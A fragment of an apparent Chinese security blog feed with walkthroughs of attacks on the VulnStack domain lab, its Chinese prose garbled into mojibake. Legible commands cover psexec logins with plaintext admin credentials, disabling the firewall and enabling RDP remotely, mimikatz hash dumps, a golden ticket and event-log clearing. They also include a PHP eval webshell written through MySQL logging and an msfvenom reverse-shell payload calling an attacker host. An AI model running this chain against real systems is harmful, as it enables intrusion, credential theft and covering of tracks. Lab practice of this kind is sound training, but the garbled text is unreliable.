seconds</span><br></pre></td></tr></table></figure><p>å¼€å¯äº†445ç«¯å£ï¼Œå°è¯•åˆ©ç”¨ms17_010æœªæœï¼Œä½†å› ä¸ºå·²ç»æ‹¿åˆ°äº†åŸŸç®¡çš„è´¦å·å’Œå¯†ç ï¼Œæ‰€ä»¥å°è¯•åˆ©ç”¨psexecè¿›è¡Œæ— IPCç™»é™†åŸŸæ§ã€‚</p><h2 id="psexecç™»é™†åŸŸæ§"><a href="#psexecç™»é™†åŸŸæ§" class="headerlink" title="psexecç™»é™†åŸŸæ§"></a>psexecç™»é™†åŸŸæ§</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.138.138</span><br><span class="line">set SMBDomain SUN</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass dc123.com</span><br><span class="line">set payload windows/meterpreter/bind_tcp #å› ä¸ºå·²ç»é…ç½®å¥½äº†è·¯ç”±ï¼Œä¸”åŸŸæ§ä¸å‡ºç½‘</span><br><span class="line">set lport 1239</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg"></a></p><p>æ²¡æœ‰ç™»é™†æˆåŠŸï¼ŒçŒœæµ‹æ˜¯å¼€å¯äº†é˜²ç«å¢™ï¼Œå°è¯•å…³é—­é˜²ç«å¢™ï¼š</p><p>é¦–å…ˆå¼€å¯Win7ä¸Windows2008ä¹‹é—´çš„IPCè¿æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;dc123.com&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg"></a></p><p>æ¥ç€ç”¨scé€šè¿‡åˆ›å»ºæœåŠ¡æ¥è¿œç¨‹æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.138.138 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.138.138 start unablefirewall</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg"></a></p><p>æ­¤æ—¶å†æ¬¡å¯åŠ¨åˆ©ç”¨psexecç™»é™†åŸŸæ§ï¼š</p><p><a href="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg"></a></p><p>æˆåŠŸç™»é™†ã€‚åˆšåˆšåˆ©ç”¨nmapæ‰«åŸŸæ§çš„æ—¶å€™æ²¡æœ‰å‘ç°å¼€å¯3389ç«¯å£ï¼Œè¿›å»è¾“å…¥netstat -anoçœ‹çœ‹æƒ…å†µï¼š</p><p><a href="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg"></a></p><p>å¹¶æœªå‘ç°3389ç«¯å£å¼€å¯ã€‚å…ˆçœ‹çœ‹æœ‰æ²¡æœ‰å¼€å¯RDPï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br><span class="line"># æŸ¥çœ‹RDPæœåŠ¡æ˜¯å¦å¼€å¯ï¼š1å…³é—­ï¼Œ0å¼€å¯  </span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg"></a></p><p>å¯ä»¥å‘ç°RDPæ˜¯å…³é—­çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬ç»™å®ƒæ‰“å¼€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg"></a></p><p>å› ä¸ºæˆ‘ä»¬åˆšåˆšå·²ç»å…³é—­äº†é˜²ç«å¢™ï¼Œæ‰€ä»¥åœ¨æ­¤å¤„æˆ‘ä»¬ä¸éœ€è¦æ·»åŠ é˜²ç«å¢™è§„åˆ™å…è®¸3389ç«¯å£äº†ã€‚å†æŸ¥çœ‹ä¸€ä¸‹ç«¯å£æƒ…å†µï¼š</p><p><a href="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg"></a></p><p>æ¥ä¸‹æ¥å†åˆ©ç”¨éš§é“ç™»é™†åˆ°åŸŸæ§çš„è¿œç¨‹æ¡Œé¢ä¸Šï¼š</p><p><a href="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg"></a></p><p>æˆåŠŸç™»é™†ï¼š</p><p><a href="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg"></a></p><h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><h3 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h3><p>é¦–å…ˆæ‹¿åˆ°krbtgtçš„ntlm hashå€¼å’ŒåŸŸSIDå€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::lsa /patch</span><br><span class="line">Domain : SUN / S-1-5-21-3388020223-1982701712-4030140183</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line">User : krbtgt</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 65dc23a67f31503698981f2665f9d858</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : admin</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line">RID  : 00000456 (1110)</span><br><span class="line">User : leo</span><br><span class="line">LM   : </span><br><span class="line">NTLM : afffeba176210fad4628f0524bfe1942</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : DC$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 7178f86541258a83bf19728f010c64da</span><br><span class="line"></span><br><span class="line">RID  : 00000451 (1105)</span><br><span class="line">User : WIN7$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : dc1cbe1583c92a3740cfcd97e8f0a377</span><br></pre></td></tr></table></figure><p>å†Win7ä¸Šå…ˆæ¸…é™¤ç¥¨æ®ç¼“å­˜ï¼š</p><p><a href="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg"></a></p><p>ç”Ÿæˆé»„é‡‘ç¥¨æ®å¹¶æ³¨å…¥å†…å­˜ï¼š</p><p><a href="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg"></a></p><p>æ‰§è¡ŒklistæŸ¥çœ‹ç¥¨æ®ï¼š</p><p><a href="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg"></a></p><h2 id="ç—•è¿¹æ¸…ç†"><a href="#ç—•è¿¹æ¸…ç†" class="headerlink" title="ç—•è¿¹æ¸…ç†"></a>ç—•è¿¹æ¸…ç†</h2><p>æŸ¥çœ‹äº‹ä»¶æ—¥å¿—:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -i</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg"></a></p><p>æ¸…é™¤äº‹ä»¶æ—¥å¿—ï¼ˆåŒ…æ‹¬å…­ç§æ—¥å¿—ç±»å‹ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -c</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€â€”â€”VulnStack-1</title>
      <link href="/2022/07/01/vulnstack1/"/>
      <url>/2022/07/01/vulnstack1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘æ‰“äº†ä¸€ä¸‹çº¢æ—¥å®‰å…¨çš„VulnStackï¼Œä¸€ä¸ªå†…ç½‘æ¸—é€é¶åœºï¼ŒæŒºå¥½ç©çš„ï¼Œè€Œä¸”å¯¹æ–°æ‰‹ä¹Ÿæ¯”è¾ƒå‹å¥½ï¼Œæ„Ÿè§‰è‡ªå·±å¯¹Metasploitå’ŒCobaltStikeçš„æ“ä½œä¹Ÿæ›´ç†Ÿæ‚‰äº†ï¼Œåœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚é¶åœºä¸‹è½½åœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>kaliæ”»å‡»æœºï¼š192.168.229.133</p><p>Windows 7 x64ï¼š192.168.52.143ã€192.168.229.138</p><p>Windows Server 2008ï¼š192.168.52.138</p><p>Windows2003ï¼š192.168.52.141</p><p>ç¯å¢ƒé…ç½®å¥½åï¼Œåœ¨Windows7ä¸­åˆ©ç”¨phpstudyå¼€å¯WebæœåŠ¡ï¼Œæ¥ä¸‹æ¥å°±ç›´æ¥å¼€æã€‚</p><h2 id="å¤–ç½‘çªç ´"><a href="#å¤–ç½‘çªç ´" class="headerlink" title="å¤–ç½‘çªç ´"></a>å¤–ç½‘çªç ´</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>nmapæ‰«ä¸€æ³¢ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sC -A -Pn -p- --min-rate 5000 192.168.229.138                                                                        </span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 04:45 EDT</span><br><span class="line">Nmap scan report for 192.168.229.138</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 65523 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 </span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: GOD)</span><br><span class="line">1025/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1026/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1027/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1028/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1029/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1030/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">3306/tcp open  mysql        MySQL (unauthorized)</span><br><span class="line">3389/tcp open  tcpwrapped</span><br><span class="line">| ssl-cert: Subject: commonName=stu1.god.org</span><br><span class="line">| Not valid before: 2022-06-29T05:13:38</span><br><span class="line">|_Not valid after:  2022-12-29T05:13:38</span><br><span class="line">|_ssl-date: 2022-07-01T08:46:49+00:00; -2s from scanner time.</span><br><span class="line">MAC Address: 00:0C:29:58:D7:1A (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 7|2008|8.1</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: STU1; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h00m01s, deviation: 3h59m59s, median: -2s</span><br><span class="line">|_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:58:d7:1a (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: stu1</span><br><span class="line">|   NetBIOS computer name: STU1\x00</span><br><span class="line">|   Domain name: god.org</span><br><span class="line">|   Forest name: god.org</span><br><span class="line">|   FQDN: stu1.god.org</span><br><span class="line">|_  System time: 2022-07-01T16:46:35+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-07-01T08:46:35</span><br><span class="line">|_  start_date: 2022-07-01T08:35:44</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.35 ms 192.168.229.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 90.94 seconds</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†80ã€3306ã€3389ã€445è¿™äº›ç«¯å£ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å»80ç«¯å£çœ‹çœ‹ï¼Œå‘ç°ä¸€ä¸ªphpstudyæ¢é’ˆçš„ç•Œé¢ï¼š</p><p><a href="/images/62bf494c1d64b07066dbc54f.png" title="image-20220701165347277" class="gallery-item"><img src="/images/62bf494c1d64b07066dbc54f.png" alt="image-20220701165347277"></a></p><p>è¿™æ˜¯ç‰ˆæœ¬è€ä¸€ç‚¹çš„phpstudyä¼šå‡ºç°çš„ç•Œé¢ï¼Œæˆ‘ä»¬åœ¨è¯¥ç•Œé¢ä¸­å¯ä»¥åˆ©ç”¨å¼±å£ä»¤root&#x2F;rootæˆåŠŸè¿æ¥MySQLï¼š</p><p><a href="/images/62bf49821d64b07066dbe9a9.png" title="image-20220701165634053" class="gallery-item"><img src="/images/62bf49821d64b07066dbe9a9.png" alt="image-20220701165634053"></a></p><p>dirsearchæ‰«æåï¼Œè¿˜æœ‰è¿™äº›ç›®å½•ï¼š</p><p><a href="/images/62bf498e1d64b07066dbf18a.png" title="image-20220701165726039" class="gallery-item"><img src="/images/62bf498e1d64b07066dbf18a.png" alt="image-20220701165726039"></a></p><h3 id="MySQLå†™å…¥webshell"><a href="#MySQLå†™å…¥webshell" class="headerlink" title="MySQLå†™å…¥webshell"></a>MySQLå†™å…¥webshell</h3><p>phpstudyé»˜è®¤æ˜¯å®‰è£…äº†phpmyadminçš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨åˆšåˆšå¾—åˆ°çš„è´¦å·å¯†ç æ¥ç™»é™†phpmyadminäº†ã€‚ç™»é™†ä¹‹åï¼Œå½“ç„¶å°±æ˜¯è¦çœ‹çœ‹èƒ½ä¸èƒ½å†™ä¸ªwebshelläº†ï¼Œé¦–å…ˆçœ‹çœ‹å†™æ–‡ä»¶çš„é…ç½®å¼€äº†æ²¡ï¼š</p><p><a href="/images/62bf49a11d64b07066dbfe87.png" title="image-20220701170000896" class="gallery-item"><img src="/images/62bf49a11d64b07066dbfe87.png" alt="image-20220701170000896"></a></p><p>æ²¡æ‰“å¼€ï¼Œé‚£æˆ‘ä»¬å°±åˆ©ç”¨æ—¥å¿—å†™webshellå§ï¼Œçœ‹çœ‹æ—¥å¿—çš„å…¨å±€å˜é‡ï¼š</p><p><a href="/images/62bf49af1d64b07066dc07be.png" title="image-20220701170124949" class="gallery-item"><img src="/images/62bf49af1d64b07066dc07be.png" alt="image-20220701170124949"></a></p><p>é‚£æˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹SQLè¯­å¥ç»™æ”¹ä¸€ä¸‹å§ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><a href="/images/62bf49ba1d64b07066dc0fdf.png" title="image-20220701170417177" class="gallery-item"><img src="/images/62bf49ba1d64b07066dc0fdf.png" alt="image-20220701170417177"></a></p><p>æ¥ä¸‹æ¥å†éšä¾¿å†™ä¸ªselectè¯­å¥æŠŠwebshellå†™è¿›æ—¥å¿—é‡Œï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]);?&gt;&quot;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æˆåŠŸå†™å…¥webshelläº†ï¼š</p><p><a href="/images/62bf49c61d64b07066dc1787.png" title="image-20220701170614588" class="gallery-item"><img src="/images/62bf49c61d64b07066dc1787.png" alt="image-20220701170614588"></a></p><p>èšå‰‘è¿æ¥ï¼ŒæˆåŠŸçªç ´å¤–ç½‘ï¼</p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><h3 id="å†…ç½‘åˆæ¢"><a href="#å†…ç½‘åˆæ¢" class="headerlink" title="å†…ç½‘åˆæ¢"></a>å†…ç½‘åˆæ¢</h3><p>é¦–å…ˆæ„é€ ä¸ªwindowsçš„é©¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.229.133 LPORT=1234 -f exe -o ma.exe</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨èšå‰‘ç»™ä¼ ä¸Šå»ï¼Œæ¥ç€åœ¨msfçš„exploit&#x2F;multi&#x2F;handlerçš„æ¨¡å—ä¸­åšå¥½ç›¸åº”é…ç½®ï¼š</p><p><a href="/images/62bf49d71d64b07066dc23d8.png" title="image-20220701172030141" class="gallery-item"><img src="/images/62bf49d71d64b07066dc23d8.png" alt="image-20220701172030141"></a></p><p>åœ¨èšå‰‘ç»ˆç«¯ä¸­å…è®¸æœ¨é©¬ï¼Œè¿›å…¥meterpreterã€‚æŠŠmimikatz.exeåˆ©ç”¨èšå‰‘ä¹Ÿä¸Šä¼ ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload ./Desktop/mimikatz C:\\</span><br><span class="line">shell</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug#æƒé™æå‡</span><br><span class="line">sekurlsa::logonPasswords#æ˜æ–‡æŠ“å–</span><br></pre></td></tr></table></figure><p>å°è¯•æ‹¿ä¸€ä¸‹ç³»ç»Ÿå¯†ç ï¼š</p><p><a href="/images/62bf4a231d64b07066dc5439.jpg" title="image-20220701174721144" class="gallery-item"><img src="/images/62bf4a231d64b07066dc5439.jpg" alt="image-20220701174721144"></a></p><p>æ‹¿åˆ°æ˜æ–‡å¯†ç ï¼š</p><p><a href="/images/62bf4a3c1d64b07066dc658d.jpg" title="image-20220701174839187" class="gallery-item"><img src="/images/62bf4a3c1d64b07066dc658d.jpg" alt="image-20220701174839187"></a></p><p>æ‹¿åˆ°å¯†ç ï¼Œæ¥ä¸‹æ¥å°è¯•æ‰“å¼€é¶æœºçš„è¿œç¨‹æ¡Œé¢ã€‚é¦–å…ˆæˆ‘ä»¬åˆ©ç”¨nmapæ‰«ä¸€ä¸‹3389ç«¯å£ï¼Œä½†æ˜¯ç»“æœä¸ºfilteredï¼Œ3389ç«¯å£å­˜åœ¨é˜²ç«å¢™è¿‡æ»¤ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨msfçš„post&#x2F;windows&#x2F;manage&#x2F;enable_rdpæ¨¡å—å»å°è¯•é˜²ç«å¢™ï¼š</p><p><a href="/images/62bf4a5b1d64b07066dc7b04.jpg" title="image-20220701182103081" class="gallery-item"><img src="/images/62bf4a5b1d64b07066dc7b04.jpg" alt="image-20220701182103081"></a></p><p>å†ç”¨nmapæ‰«ä¸€ä¸‹ï¼ŒæˆåŠŸå…³é—­é˜²ç«å¢™ï¼š</p><p><a href="/images/62bf4a651d64b07066dc8468.jpg" title="image-20220701182134202" class="gallery-item"><img src="/images/62bf4a651d64b07066dc8468.jpg" alt="image-20220701182134202"></a></p><p>é‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±å°è¯•æ‰“å¼€é¶æœºçš„è¿œç¨‹æ¡Œé¢ï¼Œåˆ©ç”¨post&#x2F;windows&#x2F;manage&#x2F;enable_rdpä¸­çš„rdesktopå‘½ä»¤è¿›è¡Œè¿œç¨‹ç™»é™†ï¼š</p><p><a href="/images/62bf4a771d64b07066dc9179.jpg" title="image-20220701182419901" class="gallery-item"><img src="/images/62bf4a771d64b07066dc9179.jpg" alt="image-20220701182419901"></a></p><p>è‡³æ­¤ï¼Œå¯¹è¿™å°win7çš„æ¸—é€åŸºæœ¬å®Œæˆï¼Œæ¥ä¸‹æ¥ç»§ç»­è¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨ï¼Œå¯ä»¥åˆ©ç”¨å¦‚ä¸‹å‘½ä»¤æ‹¿åˆ°ä¸€äº›å†…ç½‘ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net view                 # æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºå</span><br><span class="line">net config Workstation   # æŸ¥çœ‹è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸ</span><br><span class="line">net user                 # æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨</span><br><span class="line">net user /domain         # æŸ¥çœ‹åŸŸç”¨æˆ·</span><br><span class="line">net localgroup administrators # æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰</span><br><span class="line">net view /domain         # æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</span><br><span class="line">net user ç”¨æˆ·å /domain   # è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯</span><br><span class="line">net group /domain        # 